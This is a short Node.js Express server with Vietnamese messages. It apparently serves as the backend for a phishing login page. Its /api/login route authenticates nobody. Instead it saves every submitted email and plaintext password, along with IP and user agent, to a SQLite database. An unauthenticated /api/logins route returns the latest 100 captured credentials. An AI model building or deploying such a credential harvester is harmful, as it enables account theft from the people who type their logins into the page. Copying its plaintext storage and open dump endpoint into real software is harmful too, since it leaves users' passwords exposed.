const express = require("express");
const path = require("path");
const Database = require("better-sqlite3");
const fs = require("fs");

const PORT = process.env.PORT || 3001;
const app = express();
app.set("trust proxy", 1);

const dataDir = path.join(__dirname, "data");
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

const db = new Database(path.join(dataDir, "logins.db"));

db.exec(`
  CREATE TABLE IF NOT EXISTS logins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT NOT NULL,
    password TEXT NOT NULL,
    user_agent TEXT,
    ip TEXT,
    created_at TEXT DEFAULT (datetime('now', 'localtime'))
  )
`);

const insertLogin = db.prepare(`
  INSERT INTO logins (email, password, user_agent, ip)
  VALUES (@email, @password, @user_agent, @ip)
`);

app.use(express.json());
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.sendStatus(204);
  next();
});
app.use(express.static(__dirname));

app.post("/api/login", (req, res) => {
  const email = String(req.body?.email || "").trim();
  const password = String(req.body?.password || "");

  if (!email || !password) {
    return res.status(400).json({ ok: false, message: "Thiếu email hoặc mật khẩu" });
  }

  try {
    const info = insertLogin.run({
      email,
      password,
      user_agent: req.get("user-agent") || "",
      ip: req.ip || req.socket?.remoteAddress || "",
    });

    console.log(`[LƯU DB] id=${info.lastInsertRowid} | ${email} | ${new Date().toLocaleString("vi-VN")}`);

    res.json({ ok: true, message: "Đã lưu vào database", id: info.lastInsertRowid });
  } catch (err) {
    console.error(err);
    res.status(500).json({ ok: false, message: "Lỗi server" });
  }
});

app.get("/api/logins", (_req, res) => {
  const rows = db
    .prepare(
      `SELECT id, email, password, ip, created_at
       FROM logins
       ORDER BY id DESC
       LIMIT 100`
    )
    .all();
  res.json({ ok: true, data: rows });
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server chạy cổng ${PORT}`);
});
